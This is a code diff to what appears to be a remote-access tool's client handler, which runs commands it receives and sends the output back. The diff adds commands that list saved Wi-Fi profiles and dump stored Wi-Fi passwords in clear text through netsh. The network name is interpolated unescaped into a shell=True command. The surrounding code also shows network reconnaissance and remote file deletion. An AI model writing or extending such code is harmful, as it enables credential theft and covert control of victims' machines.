@@ -146,6 +146,22 @@ class ClientHandler:
                 elif cmd == "arp -a":
                     result = subprocess.run("arp -a", shell=True, capture_output=True, text=True).stdout
                     self.send_data(result.encode())
+                
+                elif cmd == "wifi-networks":
+                    if os_name=="Windows":
+                        result = subprocess.run("netsh wlan show profile", shell=True, capture_output=True, text=True).stdout
+                    else:
+                        result = "Still unavailable on linux"
+                    self.send_data(result.encode())
+                
+                elif cmd.startswith("wifi-password "):
+                    wifi_network = cmd.split(" ",1)[1]
+                    command = f'netsh wlan show profile "{wifi_network}" key=clear'
+                    if os_name=="Windows":
+                        result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
+                    else:
+                        result = "Still unavailable on linux"
+                    self.send_data(result.encode())                    
 
                 elif cmd.startswith("del "):
                     filename = cmd.split(" ", 1)[1]
